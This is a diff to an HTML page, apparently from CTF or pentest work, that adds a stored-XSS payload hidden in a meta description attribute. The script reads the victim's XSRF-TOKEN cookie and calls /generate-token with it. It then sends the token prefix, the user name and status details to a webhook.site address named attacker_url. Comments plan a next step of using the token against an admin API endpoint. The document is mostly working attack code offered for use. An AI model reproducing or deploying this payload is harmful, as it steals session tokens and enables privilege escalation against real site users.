@@ -2,11 +2,76 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Minimal Script Test</title>
-    <!-- VERSION_MINIMAL_SCRIPT_V1 -->
-    <meta name="description" content='<script>new Image().src="https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a?status=minimal_script_executed&loc="+encodeURIComponent(window.location.href);</script>'>
+    <title>Generate Token Payload</title>
+    <!-- VERSION_GEN_TOKEN_V1 -->
+    <meta name="description" content='<script>
+        (function() {
+            var webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+            var loc = window.location.href;
+
+            function sendPing(data) {
+                var params = new URLSearchParams();
+                params.append("source_tag", "name:description_GEN_TOKEN_V1");
+                for (var key in data) { params.append(key, String(data[key]).substring(0,500)); } // Stringify và cắt bớt
+                new Image().src = attacker_url + "?" + params.toString();
+            }
+
+            var xsrfTokenValue = null;
+            try {
+                var cookies = document.cookie.split(";");
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    if (cookie.startsWith("XSRF-TOKEN=")) {
+                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
+                        break;
+                    }
+                }
+            } catch (e_cookie) {
+                sendPing({ stage: "cookie_parse_error", error: e_cookie.message });
+            }
+
+            if (!xsrfTokenValue) {
+                sendPing({ stage: "xsrf_token_missing", loc: loc });
+                return; 
+            }
+            
+            sendPing({ stage: "script_start_gen_token", loc: loc, xsrf_val: xsrfTokenValue.substring(0,20) + "..." });
+
+            fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "X-XSRF-TOKEN": xsrfTokenValue
+                }
+            })
+            .then(response => {
+                var status = response.status;
+                var ok = response.ok;
+                // Để đọc body, phải clone nếu muốn log cả status và body khi có lỗi
+                var clonedResponse = response.clone(); 
+                if (!ok) {
+                    return clonedResponse.text().then(text => {
+                        sendPing({ stage: "generate_token_fail_resp", status: status, ok: ok, body_preview: text });
+                        throw new Error("GenTokenFail: " + status); // Ném lỗi để catch xử lý
+                    });
+                }
+                return response.json(); // Chỉ parse json nếu ok
+            })
+            .then(data => {
+                sendPing({ stage: "generate_token_success", token_prefix: data.token ? data.token.substring(0,10)+"..." : "no_token_field", user_name: data.user ? data.user.name : "no_user" });
+                // Ở đây, nếu thành công, bạn sẽ có data.token
+                // Bước tiếp theo là dùng data.token để gọi /api/admin/sup3rs3cr3t
+                // (Sẽ thêm vào Cải tiến Bước 3)
+            })
+            .catch(error => {
+                sendPing({ stage: "generate_token_catch_error", error_msg: error.message, error_str: error.toString() });
+            });
+        })();
+    </script>'>
 </head>
 <body>
-    <h1>Minimal Script Test Page</h1>
+    <h1>Generate Token Payload Page</h1>
 </body>
 </html>
